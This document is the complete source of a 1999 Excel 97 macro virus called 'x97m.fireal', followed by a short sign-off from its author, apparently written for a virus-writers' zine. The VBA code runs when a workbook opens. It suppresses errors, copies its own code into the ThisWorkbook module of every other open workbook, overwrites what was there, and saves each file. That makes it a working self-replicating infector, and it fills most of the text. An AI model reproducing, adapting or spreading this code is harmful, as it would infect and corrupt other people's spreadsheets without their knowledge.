'fireal
Private Sub Workbook_Open()
On Error Resume Next
For Each fireal In ThisWorkbook.VBProject.VBComponents
If fireal.Properties.Count = 73 Then ourcode = fireal.codemodule.Lines(1, 20)
Next
For Each book In Workbooks
For Each fireal In book.VBProject.VBComponents
If fireal.Properties.Count = 73 And fireal.codemodule.Lines(1, 1) <> "'fireal" Then
fireal.codemodule.deletelines 1, fireal.codemodule.countoflines
fireal.codemodule.insertlines 1, ourcode
If book.Path = "" Then book.SaveAs book.FullName Else book.Save
End If
Next
Next
End Sub
'x97m.fireal (c) 1999 jackie
'1st language independent excel class infector
'No backdrops and no lights can focus on that shit...Linezer0 '1999

---[snip]---


 Hi there kids, same as Lithium, I just can present you some old werk
because of that damn zip disk crash. Hope you can enjoy this language
independent x97m. Catch y'all around.

Do you know how I feel,
 jackie